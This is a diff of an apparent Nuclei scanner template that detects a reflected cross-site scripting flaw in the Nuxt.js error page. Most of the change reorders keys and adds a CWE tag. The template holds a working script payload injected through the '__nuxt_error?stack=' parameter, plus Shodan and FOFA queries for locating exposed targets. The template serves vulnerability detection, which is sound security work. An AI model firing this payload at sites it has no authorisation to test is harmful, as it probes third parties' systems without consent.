@@ -1,5 +1,4 @@
 id: nuxt-js-xss
-
 info:
   name: Nuxt.js Error Page - Cross-Site Scripting
   author: DhiyaneshDK
@@ -10,32 +9,30 @@ info:
     - https://huntr.dev/bounties/70ac720d-c932-4ed3-98b1-dd2cbcb90185/
     - https://bryces.io/blog/nuxt3
     - https://twitter.com/fofabot/status/1669339995780558849
+  classification:
+    cwe-id:
+      - CWE-80
   metadata:
-    verified: true
+    fofa-query: body="buildAssetsDir" && body="__nuxt"
     max-request: 1
     shodan-query: html:"buildAssetsDir" "nuxt"
-    fofa-query: body="buildAssetsDir" && body="__nuxt"
-  tags: huntr,xss,nuxtjs,vuln
-
+    verified: true
+  tags: huntr,nuxtjs,vuln,xss
 variables:
-  payload: "<script>alert(document.domain)</script>"
-
+  payload: <script>alert(document.domain)</script>
 http:
-  - method: GET
-    path:
-      - "{{BaseURL}}/__nuxt_error?stack=%0A{{url_encode(payload)}}"
-
-    matchers-condition: and
-    matchers:
-      - type: word
+  - matchers:
+      - condition: and
         part: body
+        type: word
         words:
-          - "{{payload}}"
-          - "window.__NUXT__"
-        condition: and
-
-      - type: word
-        part: header
+          - '{{payload}}'
+          - window.__NUXT__
+      - part: header
+        type: word
         words:
-          - "text/html"
-
+          - text/html
+    matchers-condition: and
+    method: GET
+    path:
+      - '{{BaseURL}}/__nuxt_error?stack=%0A{{url_encode(payload)}}'
